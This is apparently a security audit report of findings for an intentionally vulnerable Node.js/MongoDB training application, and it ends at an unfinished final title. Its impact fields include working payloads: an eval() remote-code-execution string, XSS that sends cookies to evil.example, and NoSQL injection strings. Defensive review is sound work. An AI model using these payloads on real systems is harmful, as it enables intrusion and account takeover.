title: mongodb driver (^2.1.18, installed 2.2.36) pulls a critically vulnerable bson deserializer
evidence: npm audit --json (registry reachable) resolves this range to mongodb@2.2.36 in package-lock.json. mongodb is flagged critical because it depends on bson@<=1.1.3, which carries GHSA-v8w9-2789-6hhr (critical, CWE-502, Deserialization of Untrusted Data) and GHSA-4jwp-vfvf-657p; mongodb's own driver additionally carries GHSA-mh5c-679w-hh4r (high, denial of service, range <3.1.13). The bson/mongodb-core sub-tree contributes 2 transitive advisory packages under this one direct dependency. mongodb is required throughout app/data/*-dao.js for every database read and write in the application.
impact: An attacker who can influence BSON bytes the driver deserializes (a crafted document round-tripped through the app, or a compromised/MITM'd database connection) can trigger memory corruption or a crash; combined with the driver's own DoS advisory, availability of every route that touches MongoDB is at risk.
fix: Upgrade to a maintained mongodb driver line (current major, 7.x) which pulls a patched bson; this is a semver-major change and touches every DAO file's connection and query code.

title: Server-side code injection via eval() on request body fields
evidence: app/routes/index.js:52 wires POST /contributions to contributionsHandler.handleContributionsUpdate (guarded only by isLoggedIn, no role check). That handler reads req.body.preTax, req.body.afterTax and req.body.roth directly and passes each straight into eval() with no type check, allowlist, or parseInt() beforehand (a commented-out parseInt-based fix sits directly below at lines 38-40, confirming the intended, unapplied mitigation). Any authenticated user controls the string evaluated as JavaScript on the server.
impact: An authenticated user (any role) submits a body such as preTax=require('child_process').execSync('id') to POST /contributions and that string is executed as Node.js code in the server process, giving full remote code execution and complete compromise of the application server.
fix: Never eval() request data. Use Number(req.body.preTax) or parseInt(req.body.preTax, 10) as the comment in the file already suggests, and reject the request if the result is not a finite, in-range number before it reaches any further logic.

title: Stored XSS visible to every user via unescaped Markdown rendering of memo content
evidence: app/routes/memos.js:11-17 stores req.body.memo verbatim via memosDAO.insert with no sanitization (app/data/memos-dao.js:15-24). app/routes/memos.js:19-33 (displayMemos) then loads every memo in the collection with getAllMemos, with no per-user filter, and renders memos.html, which at line 31 outputs marked(doc.memo) through Swig's {{ }} with autoescape globally disabled (server.js:135-137). marked is registered as a raw app.local (server.js:129, 'app.locals.marked = marked') so its HTML output is written straight into the page. server.js:126-128 sets marked.setOptions({sanitize: true}), a guard against raw HTML in the markdown source; I did not have marked's node_modules source available in this read-only tree to confirm that this deprecated 0.3.5-era sanitize option actually blocks script-bearing markdown constructs (e.g. link/image syntax with a javascript: URI), so I could not fully verify the guard holds and mark this 'likely' rather than 'confirmed'.
impact: Any authenticated user can POST /memos with a markdown payload; because getAllMemos returns every memo to every logged-in user (not just the author), a successful bypass of the sanitize option would run in the browser of every user who opens /memos, including an admin, and combined with the missing httpOnly cookie flag (server.js:92-100) would let an attacker harvest any viewer's session cookie.
fix: Do not rely on the deprecated marked 'sanitize' option; render memo Markdown to HTML server-side and pass it through a maintained HTML sanitizer such as DOMPurify (or sanitize-html) immediately before output, and re-enable Swig autoescape globally so any future unescaped variable does not become a silent XSS sink.

title: Admin account is seeded with a hard-coded plaintext password compared by strict equality
evidence: artifacts/db-reset.js's USERS_TO_INSERT array sets the admin user's password to the literal "Admin_123" at line 18; the bcrypt-hashed alternative on line 19 is commented out, so the plaintext literal is what gets inserted. This script runs during deployment: docker-compose.yml's web service command chain runs `node artifacts/db-reset.js` before `npm start`, and app.json's Heroku `postdeploy` hook runs the same script. app/data/user-dao.js stores whatever password addUser receives unhashed (line 25, `password //received from request param`, with the bcrypt.hashSync fix commented out at line 29) and validateLogin's comparePassword helper (line 61) does `return fromDB === fromUser`, a plaintext strict-equality check. So a deployment that has run the seed script authenticates the literal admin/Admin_123 credential.
impact: Any unauthenticated visitor who reaches the login page can sign in as the admin user with userName=admin and password=Admin_123, gaining admin-only functionality such as changing any employee's benefit start date via the benefits module (app/routes/benefits.js) and full access to whatever an authenticated admin session exposes.
fix: Do not seed a real deployment with a fixed plaintext password. Generate a random password per deployment or require an operator-supplied one via environment variable, hash it with bcrypt before storing (re-enable the commented-out bcrypt.hashSync/bcrypt.compareSync calls), and force a password change on first login.

title: No CSRF protection anywhere in the app; profile update (bank account, SSN, address) is forgeable from a cookie-authenticated session
evidence: The chain in front of this route is only `isLoggedIn`, which reads the session cookie and never checks any per-request token. Across the whole app no CSRF middleware is ever mounted: server.js:7 `const csrf = require('csurf');` is commented out, server.js:104-113 shows the entire `app.use(csrf())` block and the `res.locals.csrftoken` helper commented out, and app/routes/index.js never references a csrf token anywhere. handleProfileUpdate (app/routes/profile.js:40-107) reads `firstName, lastName, ssn, dob, address, bankAcc, bankRouting` straight from `req.body` and writes them via `profile.updateUser(parseInt(userId), ...)` keyed only on `req.session.userId` (profile.js:78-91), with no token or Origin/Referer check anywhere on the path.
impact: A page on another origin that auto-submits a form to POST /profile (the victim's session cookie is attached automatically by the browser) can silently overwrite the victim's bank account number, routing number, SSN, address, and name.
fix: Re-enable `csurf()` (or an equivalent double-submit/SameSite=Strict scheme) mounted before the routes in server.js, and include the token in every state-changing form (profile, benefits, contributions, memos, login).

title: Allocations page is an IDOR: any logged-in user can read any other user's allocation data by changing the URL
evidence: The chain in front of this route is only `isLoggedIn` (app/routes/session.js:36-42), which checks `req.session.userId` is set but never compares it to the `:userId` route parameter. The handler at app/routes/allocations.js:16-23 reads `const { userId } = req.params;` (the commented-out lines 12-15 show the intended fix, 'take user id from session instead of from URL param', was reverted) and passes that attacker-controlled value straight into `allocationsDAO.getByUserIdAndThreshold(userId, threshold, ...)` with no ownership check anywhere on the path. Any authenticated user can therefore request `/allocations/<any-id>` and receive another user's stock/fund/bond allocation.
impact: A logged-in low-privilege user enumerates other users' financial allocation records simply by walking the numeric `:userId` path segment; no admin or ownership check exists anywhere in the chain.
fix: Ignore the `:userId` route parameter and load allocations for `req.session.userId` only, or verify `req.session.userId === req.params.userId` (or that the caller is admin) before calling the DAO.

title: Admin-only benefits update has no role check; any logged-in user can change any other user's benefit start date
evidence: app/routes/index.js:27 defines `const isAdmin = sessionHandler.isAdminUserMiddleware;` (session.js:25-34, which checks `user.isAdmin` server-side) but it is applied nowhere: the commented-out lines 57-60 right after this route ('Fix for A7 ... checks user role') show the intended `isLoggedIn, isAdmin` chain was never restored, so the live chain is `isLoggedIn` only. The handler `updateBenefits` (app/routes/benefits.js:29-54) takes `userId` straight from `req.body` and calls `benefitsDAO.updateBenefits(userId, benefitStartDate, ...)`, which does `usersCol.update({ _id: parseInt(userId) }, { $set: { benefitStartDate: startDate } }, ...)` (app/data/benefits-dao.js:23-30) with no check that the caller is an admin or that `userId` belongs to the caller. The sibling GET /benefits at line 55 has the identical gap and unconditionally renders `user: { isAdmin: true }` for every caller, so the admin-only benefits screen itself is shown to any logged-in user.
impact: Any authenticated non-admin user can POST an arbitrary `userId` and `benefitStartDate` to overwrite another employee's benefits record, and can view the admin benefits roster of all non-admin users, a full vertical privilege escalation on a state-changing route.
fix: Add the existing `isAdmin` middleware to both the GET and POST /benefits routes (`app.get("/benefits", isLoggedIn, isAdmin, ...)`, `app.post("/benefits", isLoggedIn, isAdmin, ...)`), as the commented-out code already shows.

title: Login compares passwords with plain string equality on plaintext-stored passwords, not a constant-time hash verify
evidence: comparePassword (user-dao.js:60-67) is the sole password check used by validateLogin (line 75: `if (comparePassword(password, user.password))`); it does a plain `===` string comparison, and the commented-out replacement two lines below (`return bcrypt.compareSync(fromDB, fromUser);`) shows the constant-time hashed verify was deliberately not used. This is only possible because addUser (line 17-47) stores `password` verbatim into the document (`password // received from request param`, line 25) with the `bcrypt.hashSync(...)` alternative commented out at line 29 — passwords are never hashed at all, so every credential in the `users` collection is plaintext and every login compares it with a non-constant-time `===`.
impact: The `===` comparison leaks timing information proportional to the number of matching leading characters, letting an attacker who can measure response time recover a valid password character-by-character; independently, because passwords are stored in plaintext, any read access to the `users` collection (backup, misconfigured export, or another injection flaw) discloses every user's real password in the clear, not a hash.
fix: Hash passwords on signup with bcrypt (`bcrypt.hashSync(password, bcrypt.genSaltSync())`) and verify with the library's constant-time `bcrypt.compareSync(password, user.password)` instead of `===`.

title: The application only ever listens over plain HTTP; the HTTPS path is fully commented out
evidence: This is the only server the app starts. The alternative HTTPS server (loading artifacts/cert/server.key and artifacts/cert/server.crt) is entirely commented out at lines 18-28 and 149-155, so it never runs. Every request that carries the login form (userName/password), the session cookie (server.js:78-102, signed with cookieSecret), and the profile form (SSN, date of birth, bank account and routing numbers, app/routes/profile.js:42-50) travels in cleartext.
impact: Anyone positioned to observe network traffic between the browser and the server (shared Wi-Fi, a compromised router, an on-path ISP) can read login credentials, session cookies, and SSN/bank details for every user in plaintext, and can replay a captured session cookie to impersonate that user.
fix: Uncomment and use the existing https.createServer(httpsOptions, app) path, terminate TLS (directly or via a reverse proxy/load balancer), and redirect all HTTP traffic to HTTPS.

title: Passwords are stored and compared in cleartext, never hashed
evidence: addUser() (app/data/user-dao.js:17-31) builds the user document directly from the password parameter passed in from app/routes/session.js handleSignup, which is req.body.password verbatim; the bcrypt.hashSync() call that would hash it is commented out (line 29). This is confirmed by validateLogin()'s comparePassword() at line 61, `return fromDB === fromUser;`, which does a plain string comparison against the stored value instead of bcrypt.compareSync() (also commented out, line 65). bcrypt-nodejs is even declared as a dependency in package.json but is never invoked anywhere in the codebase.
impact: Every user's password sits in the MongoDB `users` collection as plaintext. Anyone with read access to the database (an operator, a backup, or an attacker who reaches it through any other flaw such as the NoSQL injection in app/data/allocations-dao.js) recovers every account's real password immediately, with no cracking needed, and can reuse it on other services the same user has an account with.
fix: Hash passwords with bcrypt (already a dependency) at signup: `password: bcrypt.hashSync(password, bcrypt.genSaltSync())`, and verify with `bcrypt.compareSync(fromUser, fromDB)` at login. Never store or compare the raw password.

owasp: A09:2021 Security Logging and Monitoring Failures
title: Session-signing secret and crypto key are printed to stdout on every application start
evidence: config.js merges config/env/all.js (which hardcodes `cookieSecret: "session_cookie_secret_key_here"` and `cryptoKey: "a_secure_key_for_crypto_here"`) with the environment file into `config`, then line 12-13 dumps the entire merged object with util.inspect and console.log before the config is exported and used by server.js to sign session cookies (server.js:82, `secret: cookieSecret`).
impact: Anyone who can read the process's stdout/log output (container logs, a log shipper, a CI job) obtains the exact secret express-session uses to sign session cookies, and can forge a valid session cookie for any user, including an admin, without ever authenticating.
fix: Remove the console.log of the full config object, or redact secret-bearing keys (cookieSecret, cryptoKey) before logging. Load these secrets from the environment/a vault rather than a committed default, and rotate the current hardcoded values.

title: SSN, date of birth and bank account/routing numbers are stored in the database unencrypted
evidence: updateUser() writes ssn, dob, bankAcc and bankRouting straight onto the user document that MongoDB persists. The only encryption path in this file (a crypto.pbkdf2Sync-derived key encrypting ssn/dob via AES, lines 15-40 and the encrypt() calls at lines 67-76) is entirely commented out, and getByUserId()'s matching decrypt() calls (lines 100-105) are commented out too, confirming the encrypted path was never wired up. bankAcc and bankRouting have no encryption path at all, commented or otherwise.
impact: Anyone with read access to the MongoDB `users` collection (an operator, a misconfigured backup, or an attacker reaching the DB through another flaw) obtains every user's Social Security number, date of birth, and bank account and routing numbers in plaintext, enabling identity theft and financial fraud.
fix: Encrypt ssn, dob, bankAcc and bankRouting at rest with an authenticated cipher (AES-GCM) using a key from a KMS/secrets manager (not a hardcoded config value), and decrypt only when serving the owning user's own profile.

title: marked is pinned to 0.3.5, exact, and renders user-supplied memo text with no later sanitization fixes
evidence: The manifest pins marked with no range operator at all (0.3.5, not ^0.3.5), so npm never resolves a newer patch even within the 0.x line; package-lock.json also holds 0.3.5. Six GHSAs apply to this exact version: GHSA-7px7-7xjx-hxm8 and GHSA-vfvf-mqq8-rwqc (XSS via data URIs / entity sanitization bypass, CWE-79), and GHSA-x5pg-88wf-qq4p, GHSA-rrrm-qjm4-v8hf, GHSA-5v2h-r2cx-5xgj, GHSA-p9wx-2529-fp83 (ReDoS, CWE-400/1333). app/views/memos.html:31 calls `{{ marked(doc.memo) }}`, rendering a user-controlled memo field through this exact vulnerable marked version with no visible escaping in the template.
impact: A memo body containing a crafted data-URI link or malformed HTML entity can execute script in the browser of any user who views the memo; a crafted memo body can also hang the rendering process via the ReDoS advisories.
fix: Upgrade to marked@0.3.19 (the audit's suggested same-major fix) at minimum, or to a current marked major with output sanitization reviewed; also pin with a range (not an exact bare version) going forward so patch fixes are reachable.

title: swig (^1.4.2, installed 1.4.2, pinned to the last-ever release) is the app's view engine and carries an unfixed path-traversal advisory
evidence: server.js requires swig and registers it via consolidate as the Express view engine. GHSA-2rq5-699j-x7p6 (high, CWE-22, arbitrary local file read during template rendering) matches range <=1.4.2, which is the exact installed version, and npm audit reports fixAvailable: false because no later release exists. `npm view swig deprecated` returns "This package is no longer maintained"; the registry's full publish history for swig shows its last version, 1.4.2, was published 2014-08-04 with nothing since — swig has had no release in over 11 years. swig also pulls uglify-js (1 transitive advisory, GHSA-c9f4-xj24-8jqx, ReDoS).
impact: Because this is the app's active template engine, a request path that lets an attacker influence which template or include is rendered could read arbitrary files readable by the server process. There is no upstream fix to apply.
fix: Replace swig with a maintained template engine (e.g. the app's own consolidate abstraction already supports nunjucks, ejs, pug); swig cannot be patched in place because the project is abandoned.

title: underscore (^1.8.3, installed 1.9.1) is well below the version that fixes a template code-execution advisory
evidence: npm audit resolves this range to underscore@1.9.1. GHSA-cf4h-3jhx-xvhq (critical, CWE-94, Arbitrary Code Execution, affects >=1.3.2 <1.12.1) and GHSA-qpx9-hpmf-5gmw (high, unbounded recursion DoS in _.flatten/_.isEqual, affects <=1.13.7) both apply to 1.9.1. underscore has no other vulnerable sub-dependencies of its own (0 transitive advisories); the risk is in the package's own code.
impact: If any code path passes attacker-influenced data into underscore's templating (_.template) or the affected recursive functions, an attacker gains code execution or can exhaust the process with a crafted deeply-nested structure.
fix: Upgrade to underscore@1.13.7 or later (currently 1.13.8), which is a semver-minor/patch change on the same major line.

title: NoSQL injection via unescaped $where clause built from a query-string threshold
evidence: app/routes/allocations.js:19-23 takes threshold straight from req.query (no isAdmin check, only isLoggedIn) and passes it unmodified to allocationsDAO.getByUserIdAndThreshold. app/data/allocations-dao.js:57-79 builds a MongoDB $where clause (server-side JavaScript evaluated per document) by interpolating that raw threshold into a template literal at line 78, then app/data/allocations-dao.js:86 executes it with allocationsCol.find(searchCriteria()). The file's own comment at lines 63-76 documents the intended fix (parseInt + range check) that was never applied to the active code path.
impact: An authenticated user can supply GET /allocations/<userId>?threshold=1'%3B while(true){} to trigger a denial-of-service infinite loop inside MongoDB's JS evaluator, or a payload such as 1' || '1'=='1 to break out of the intended comparison and read allocation records belonging to any user, not just the one named in the URL.
fix: Never build $where from request input. Use parseInt(threshold, 10) with a bounds check and pass stocks/threshold as separate query fields (e.g. {userId: parsedUserId, stocks: {$gt: parsedThreshold}}) instead of a $where string.

title: Reflected XSS via unescaped firstName echoed back on profile validation failure
snippet: <input type="text" class="form-control" id="firstName" name="firstName" value="{{firstNameSafeString}}" placeholder="Enter first name">
evidence: server.js:135-137 calls swig.setDefaults({autoescape: false}), disabling HTML escaping for every {{ }} expression in every template. app/routes/profile.js:40-76 destructures firstName from req.body and, when the bankRouting regex fails validation, assigns it unmodified to firstNameSafeString (line 64: 'const firstNameSafeString = firstName;' -- no encoding despite the name) and renders the profile template with it at line 65-75. profile.html:41 interpolates that value into an HTML attribute with autoescaping off, so no encoding occurs anywhere on the path.
impact: POST /profile with firstName="><script>fetch('//evil.example/c?'+document.cookie)</script> and any bankRouting value that fails the regex causes the script to execute in the submitting user's own browser in the immediate response. Because CSRF protection is disabled application-wide (server.js:104-113, the entire csrf() block is commented out) and the session cookie has no httpOnly flag configured (server.js:92-100, also commented out), an attacker can host a page that auto-submits this POST as any logged-in victim and then read the victim's session cookie via document.cookie, taking over their session.
fix: Re-enable autoescape (swig.setDefaults({autoescape: true})) or, at minimum, HTML-encode firstName before assigning it to firstNameSafeString (e.g. with node-esapi's encodeForHTML, already used elsewhere in this file for the website field).

title: Stored XSS via unescaped profile fields persisted to MongoDB and re-rendered
snippet: <input type="text" class="form-control" id="lastName" name="lastName" value="{{lastName}}" placeholder="Enter last name">
evidence: app/routes/profile.js:40-50 destructures lastName (plus ssn, dob, address, bankAcc, bankRouting) straight from req.body and passes it to profile.updateUser. app/data/profile-dao.js:42-63 stores each field verbatim into the users collection via $set with no sanitization, then app/routes/profile.js:100-104 re-renders the profile page with the DAO's returned object, and app/routes/profile.js:13-37 (displayProfile) does the same on every subsequent GET /profile from the stored document. profile.html:45 interpolates lastName with no escaping because server.js:135-137 disables Swig autoescape globally; the same unescaped pattern also applies to {{ssn}} (line 49), {{dob}} (line 53), {{bankAcc}} (line 57), {{bankRouting}} (line 61) and {{address}} (line 66) in this same template.
impact: A user stores lastName=<script>document.location='//evil.example/c?'+document.cookie</script> via POST /profile; the payload persists in MongoDB and executes every time /profile is subsequently rendered for that account. Combined with the disabled CSRF protection (server.js:104-113) an attacker can plant this payload into a victim's own profile via a forged cross-site request, and combined with the missing httpOnly cookie flag (server.js:92-100) the resulting script can read and exfiltrate the victim's session cookie, yielding full account takeover.
fix: Re-enable Swig's autoescape globally (swig.setDefaults({autoescape: true})), or HTML-encode each of these fields at render time; also validate/sanitize these fields server-side before persisting them.

title: Session cookie is configured with no httpOnly, secure or sameSite attribute and keeps the default cookie name
evidence: The `express-session` options object passed at line 78 only sets `secret`, `saveUninitialized` and `resave`. The `cookie: { httpOnly: true, secure: true }` object that would set those flags, and the `key: "sessionId"` option that would replace the framework's default cookie name, are both left inside block comments (lines 86-100). No `sameSite` value is set anywhere. The result is the framework default cookie, named `connect.sid`, with no HttpOnly, Secure or SameSite attribute.
impact: Because the cookie is not HttpOnly, any script that runs in the page (and swig's autoescape is disabled globally, server.js line 137) can read `document.cookie` and exfiltrate the session id via XSS. Because it is not Secure, the browser will also send it over the plain-HTTP connection the server accepts (see platform-no-tls). Because it has no SameSite value, it is sent on cross-site requests, compounding the CSRF gap in this same file.
fix: Set `cookie: { httpOnly: true, secure: true, sameSite: 'strict', maxAge: <bounded value> }` and `key: "sessionId"` (or another non-default name) in the session() options, and only enable `secure: true` once the app is served over HTTPS.

title: CSRF protection is installed as a dependency but never mounted; every state-changing route accepts unprotected form posts
evidence: `csurf` is a declared dependency (package.json) and required at line 7 (`// const csrf = require('csurf');`), but both the require and the middleware that would mount it are commented out. I checked every POST route registered in app/routes/index.js - /login, /signup, /profile, /contributions, /benefits, /memos - and none of their handlers (session.js, profile.js, contributions.js, benefits.js, memos.js) read or verify a CSRF token; the only state carried between requests is the session cookie, which (per platform-cookie-flags-missing) has no SameSite attribute either.
impact: Any page an authenticated victim visits can submit a cross-site form to, for example, POST /profile or POST /contributions, and the browser will attach the session cookie automatically; the server has no token to check, so the forged request succeeds and changes the victim's data.
fix: Uncomment the csurf middleware and the res.locals.csrftoken wiring, include the token as a hidden field in every state-changing form in app/views, and reject requests that omit or mismatch it.

title: Server only listens over plain HTTP; the HTTPS setup is fully commented out
evidence: The only server the process starts is `http.createServer(app).listen(port, ...)` at line 145. The alternative `https.createServer(httpsOptions, app).listen(...)` block (lines 149-155) and the certificate loading it depends on (lines 18-28, which read artifacts/cert/server.key and server.crt) are both block-commented out, and nothing else in the file establishes TLS or redirects HTTP to HTTPS. This also means the commented-out `helmet.hsts()` call from the headers finding could never take effect even if uncommented, since HSTS requires an HTTPS origin.
impact: The login form (app/routes/session.js handleLoginRequest, POST /login) and every subsequent request carrying the express-session cookie travel in cleartext. A network attacker (shared Wi-Fi, ARP spoofing, a compromised router) can read credentials and session cookies off the wire and hijack any account.
fix: Terminate TLS at the app or at a reverse proxy in front of it, uncomment the https.createServer block (or an equivalent), and redirect any plain HTTP request to HTTPS before session or credential data is accepted.

title: Express session-signing secret is hard-coded in committed configuration and applies to every environment including production
evidence: config/env/all.js sets cookieSecret to the literal string "session_cookie_secret_key_here". config/config.js merges this file with the environment-specific one (`{ ...allConf, ...envConf }`); config/env/production.js is `module.exports = {};` (empty) and neither config/env/development.js nor config/env/test.js override cookieSecret, so the literal from all.js is the value used in every environment, including production. server.js line 82 passes it straight into express-session's `secret` option (`secret: cookieSecret`) inside the app.use(session({...})) call that runs for every request.
impact: Anyone who has read this repository's source (it is a public OWASP training repo, but the same applies to any private fork) knows the exact session-signing secret any unmodified deployment uses. With it they can forge a validly-signed express-session cookie for an arbitrary user id and impersonate that user without ever authenticating.
fix: Read the secret from a required environment variable with no hard-coded literal fallback, generate a strong random value per deployment, and rotate the currently-committed value.

title: Login does not regenerate the session id, allowing session fixation
evidence: handleLoginRequest (session.js:53-119) validates credentials via userDAO.validateLogin and then, on success, writes `req.session.userId = user._id` directly onto the pre-existing session at line 116 with no `req.session.regenerate()` call; the explanatory comment immediately above (lines 104-115) names the fix and says to wrap this assignment in `req.session.regenerate(() => {})`, but that wrapping was never applied here. This is inconsistent with handleSignup in the same file, which does call `req.session.regenerate(() => { req.session.userId = user._id; ... })` at line 234. Because express-session is configured with `saveUninitialized: true` (server.js:84), an unauthenticated visitor already has a session id (e.g. set via a pre-login response) before ever logging in.
impact: An attacker who fixes a victim's pre-login session id (trivial here since sessions are created for unauthenticated visitors too) inherits the victim's authenticated session once the victim logs in with that id, without needing to see the victim's credentials.
fix: Call `req.session.regenerate()` before setting `req.session.userId` in handleLoginRequest, exactly as handleSignup already does.

title: Session cookie is configured with no httpOnly, no secure flag, and no maxAge (never expires)
evidence: Reading the full express-session config at server.js:78-102: the object passed is `{ secret: cookieSecret, saveUninitialized: true, resave: true }` — no `cookie` key is present at all. The commented-out block at lines 86-100 shows the intended fixes were never applied: `key: "sessionId"` (generic cookie name), `cookie: { httpOnly: true /* secure: true */ }` — none of these are active in the object actually passed to `session(...)`. There is also no `maxAge`/`expires` anywhere in this file or in config/env/*.js, so the cookie is a non-expiring session cookie, and the server is started with `http.createServer` (line 145), not HTTPS, so `secure` would have no effect even if set.
impact: The session cookie is readable by any script injected via XSS (no httpOnly), is sent in the clear (no secure flag, plain HTTP server), and never expires on its own, so a stolen or fixed session id remains valid indefinitely.
fix: Set `cookie: { httpOnly: true, secure: true, maxAge: <a bounded value>, sameSite: 'lax' }` in the session() call and serve over HTTPS.

owasp: A09:2021 Security Logging and Monitoring Failures
title: Seed script logs hardcoded plaintext admin and user passwords to stdout on every container start
evidence: USERS_TO_INSERT (lines 12-37) hardcodes plaintext passwords "Admin_123", "User1_123", "User2_123" for the admin and two test users. Line 99 serializes and logs each full user object, including the `password` field, to stdout. docker-compose.yml line 9 runs `node artifacts/db-reset.js && npm start` as the container's startup command, so this logging happens on every container boot, not just a one-off manual run.
impact: Anyone who can read the container/application logs (via `docker logs`, a shipped log aggregator, or CI output) recovers the admin account's plaintext password and can log in with full administrative privileges.
fix: Never log a user object that contains a password field; log only the userName/_id. Load seed credentials from environment variables or a secrets manager instead of hardcoding them, and pre-hash them before insertion.

title: Internal error objects are rendered directly to the client on every unhandled error
evidence: The Express error-handling middleware passes the caught `err` object straight into the `error-template` view as the `error` local. app/views/error-template.html:11 outputs it unescaped as `{{error}}`, and server.js:135-142 sets `swig.setDefaults({ autoescape: false })` globally, so whatever `err`'s string form contains (name and message, e.g. a MongoDB driver error message revealing query/collection details) is written straight into the HTML response with no environment check gating it to development only.
impact: Any user who triggers a server error (including an unauthenticated one, since this middleware runs for the whole app) receives the raw internal error message in the response, which can reveal database error text, internal object structure, or file paths that help an attacker map the backend for further attacks.
fix: Render a generic, static error message to the client and log err.message/err.stack server-side only (already done via console.error at lines 7-8). Only include error detail in the response when NODE_ENV is explicitly development.

title: body-parser (^1.15.1, installed 1.18.3) is below the version that fixes a request-parsing DoS
evidence: npm audit resolves this range to body-parser@1.18.3. GHSA-qwcr-r2fm-qrc7 (high, CWE-405, denial of service when URL encoding is enabled, fixed in 1.20.3) and GHSA-v422-hmwv-36x6 (low, CWE-770, an invalid limit value silently disables size enforcement, fixed in 1.20.6) both apply. body-parser is used as Express's request-body middleware, so this is on the path of every request with a body. It also pulls one transitive advisory package (qs).
impact: A request with a crafted urlencoded body can consume disproportionate CPU/memory on any route accepting a body, and a misconfigured size limit would silently stop enforcing request-size caps.
fix: Upgrade body-parser to 1.20.6 or later, or move to the body parser bundled with a current express release.

title: express (^4.13.4, installed 4.16.4) is below the versions that fix an open-redirect and an XSS advisory
evidence: npm audit resolves this range to express@4.16.4. GHSA-rv95-896h-c2vc (moderate, CWE-601/1286, open redirect on malformed URLs, fixed in 4.19.2) and GHSA-qw6h-vgh9-j6wx (low, CWE-79, XSS via response.redirect(), fixed in 4.20.0) both apply. Separately, express's own bundled dependencies (cookie, path-to-regexp, qs, send — 4 transitive advisory packages) add a high-severity ReDoS in path-to-regexp (GHSA-9wv6-86v2-598j and others, range <=0.1.12) and prototype pollution in qs.
impact: A request with a crafted, malformed URL can be redirected to an attacker-controlled host by any route that echoes part of the path into a redirect, and the bundled path-to-regexp version is vulnerable to regex denial of service on route matching itself.
fix: Upgrade express to at least 4.21.3 (patches the direct advisories; still a semver-minor within the 4.x line) or to the current 5.x major, which also carries a fixed path-to-regexp.

title: forever (^2.0.0, installed 2.0.0) carries the largest transitive advisory tree of any direct dependency (11 advisories)
evidence: npm audit resolves this range to forever@2.0.0 and marks it critical because of its dependency chain: forever -> flatiron/forever-monitor -> broadway/optimist/nconf -> minimist. minimist carries GHSA-vh95-rmgr-6w4m and GHSA-xvch-5gv4-984h (prototype pollution, CWE-1321); nconf carries GHSA-6xwr-q98w-rvg7 (prototype pollution). In total 11 distinct vulnerable packages (anymatch, braces, broadway, chokidar, flatiron, forever-monitor, micromatch, minimist, nconf, optimist, readdirp) roll up to this one direct dependency per npm audit's own dependency graph. I did not trace how forever's process-manager CLI is invoked in this repo's own automation, so reachability from an HTTP request is not established.
impact: forever is an operational process manager, not something normally on the HTTP request path; the prototype-pollution issues in its config/argument-parsing dependencies matter mainly if forever is run against untrusted config files or arguments, which would then corrupt Object.prototype for the whole process.
fix: Upgrade to forever@4.0.3 (a semver-major jump) which drops the vulnerable flatiron/nconf/optimist chain, or replace forever with a maintained process supervisor (pm2, systemd) since forever's own upstream activity is sparse.

title: grunt (^1.0.3, devDependency) itself carries a code-execution advisory, not just its dependencies
evidence: npm audit resolves this range to a vulnerable grunt and lists three advisories on the grunt package itself (not a sub-dependency): GHSA-m5pj-vjjf-4m3h (high, CWE-1188, Arbitrary Code Execution), GHSA-rm36-94g8-835r (high, CWE-367, race condition), GHSA-j383-35pm-c5h4 (moderate, CWE-22, path traversal). package.json's own `test`, `db:seed` and `precommit` scripts all invoke grunt directly. 4 transitive advisory packages (grunt-legacy-util, js-yaml, minimatch, plus grunt's own listed CVEs) roll up to this direct dependency.
impact: Anyone who runs `npm test`, `npm run db:seed` or the precommit hook against an untrusted Gruntfile.js or a crafted temp-file race is running a build tool with a known arbitrary-code-execution path; this is a build/CI risk, not a risk to the deployed server.
fix: Upgrade grunt to the latest 1.x (npm audit reports fixAvailable: true, i.e. a non-major bump resolves it).

title: helmet (^2.0.0, installed 2.3.0) is four major versions behind and its transitive chain carries a ReDoS advisory
evidence: npm audit resolves this range to helmet@2.3.0. Its dependency chain (connect -> finalhandler -> debug) reaches GHSA-9vvw-cc9w-f27h and GHSA-gxpj-cx7g-858c (both CWE-400/1333, ReDoS in debug, range covers the installed <=2.6.8 debug). helmet-csp, a transitive dependency, separately carries GHSA-c3m8-x3cg-qm2c (moderate, Configuration Override). 5 transitive advisory packages (connect, debug, finalhandler, helmet-csp, ms) roll up to this direct dependency. Current helmet is major version 8; the 2.x line predates helmet's modern CSP-by-default and header-hardening defaults, so whatever helmet() call this app makes is working from an 8-generations-old default set.
impact: The ReDoS in debug can be triggered by a crafted string logged through connect's debug output, tying up the event loop; separately, running such an old helmet major means the app likely does not get the security headers (CSP, modern referrer-policy, etc.) that current helmet defaults provide.
fix: Upgrade to helmet@8.x (a semver-major rewrite of helmet's API to a middleware-composition model) and review which of the current sub-middlewares (contentSecurityPolicy, etc.) need to be explicitly enabled.

title: NoSQL operator injection in login lookup via JSON request body
evidence: server.js:71 registers bodyParser.json(), so req.body.userName can be a JSON object rather than a string. app/routes/session.js:53-58 destructures userName straight from req.body and passes it unchanged to userDAO.validateLogin, which places it as the value of the userName key in usersCol.findOne({userName: userName}) at user-dao.js:91-93 with no type check or string coercion anywhere on the path.
impact: An unauthenticated attacker can POST /login with Content-Type: application/json and a body such as {"userName":{"$regex":"^a"},"password":"x"}; MongoDB evaluates the operator instead of an exact match, letting the attacker enumerate valid usernames and select an arbitrary user record via boolean/regex-based probing. Password comparison still happens in application code (user-dao.js:60-61) so this alone does not disclose the password, but it defeats the intended exact-match lookup and is a live injection into the query.
fix: Reject any req.body.userName (and password) that is not a string before it reaches the DAO, e.g. `if (typeof userName !== "string") return next(new Error("invalid"))`, or use a schema validator (Joi/celebrate) on the login route.

title: Open redirect via unvalidated url query parameter
evidence: The GET /learn handler at app/routes/index.js:70-73 takes req.query.url directly, with no allowlist or same-origin check, and passes it straight to res.redirect(); the comment on the preceding line calls this out as the intentionally insecure pattern.
impact: An attacker sends a victim a link such as https://nodegoat-host/learn?url=https://evil.example/phish; because the link's host is the trusted application, the victim is more likely to follow it, and the app then redirects the already-authenticated browser to the attacker's phishing or malware site.
fix: Validate req.query.url against an allowlist of known-safe destinations (or internal paths only) before calling res.redirect(), and reject/ignore the parameter otherwise.

title: Config defaults to the development environment when NODE_ENV is unset, injecting a live-reload script and debug settings into every page
